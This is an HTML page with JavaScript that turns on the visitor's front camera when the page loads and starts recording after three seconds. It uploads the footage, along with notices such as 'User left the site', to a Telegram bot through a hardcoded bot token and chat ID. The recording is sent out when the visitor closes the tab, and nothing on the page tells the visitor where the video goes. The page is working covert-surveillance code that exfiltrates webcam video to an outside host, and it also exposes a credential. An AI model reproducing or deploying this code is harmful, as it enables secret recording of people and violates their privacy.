<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Recording and Telegram</title>
    <style>
        #video {
            display: block;
            width: 640px;
            height: 480px;
        }
        #progress {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>Video Recording and Sending to Telegram</h1>
    <video id="video" autoplay></video>
    <div id="progress">Progress: <span id="progressText">0%</span></div>

    <script>
        const video = document.getElementById('video');
        const progressText = document.getElementById('progressText');

        let mediaRecorder;
        let recordedChunks = [];

        const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
        const chatId = '6121166273'; // Замените на ваш chat ID

        // Function to start video
        function startVideo() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    video.srcObject = stream;
                    setupMediaRecorder(stream);

                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            mediaRecorder.start();
                            console.log('Recording started');
                            sendNotificationToTelegram('User has started recording.');
                        }, 3000);
                    };
                })
                .catch(err => console.error("Error accessing camera: ", err));
        }

        // Function to setup MediaRecorder
        function setupMediaRecorder(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                    updateProgress();
                }
            };

            mediaRecorder.onstop = () => {
                console.log('MediaRecorder stopped.');
                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                recordedChunks = []; // Reset chunks after processing
                const videoURL = URL.createObjectURL(blob);
                console.log('Recording stopped. Preparing to send video...');
                sendNotificationToTelegram('Recording stopped. Preparing to send video...');
                sendToTelegram(blob);
            };
        }

        // Function to update progress
        function updateProgress() {
            const percentage = Math.round((recordedChunks.length / (mediaRecorder && mediaRecorder.state === 'recording' ? 100 : 1)) * 100);
            progressText.textContent = `${percentage}%`;
        }

        // Function to send video to Telegram
        function sendToTelegram(blob) {
            const url = `https://api.telegram.org/bot${token}/sendVideo`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'recording.mp4');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Video sent successfully:', data);
                    sendNotificationToTelegram('Video sent successfully.');
                } else {
                    console.error('Telegram API error:', data.description);
                    sendNotificationToTelegram('Error sending video to Telegram: ' + data.description);
                }
            })
            .catch((error) => {
                console.error('Error sending video to Telegram:', error);
                sendNotificationToTelegram('Error sending video to Telegram: ' + error.message);
            });
        }

        // Function to send notification to Telegram
        function sendNotificationToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message);

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Notification sent successfully:', data);
                } else {
                    console.error('Telegram API error:', data.description);
                }
            })
            .catch((error) => console.error('Error sending notification to Telegram:', error));
        }

        // Handle browser tab or window close
        window.addEventListener('beforeunload', (event) => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                console.log('Recording stopped due to user leaving the site');
                sendNotificationToTelegram('User left the site. Recording stopped.');
                event.preventDefault(); // Required for modern browsers
                event.returnValue = ''; // For some browsers
            }
        });

        // Start video on page load
        window.onload = startVideo;
    </script>
</body>
</html>
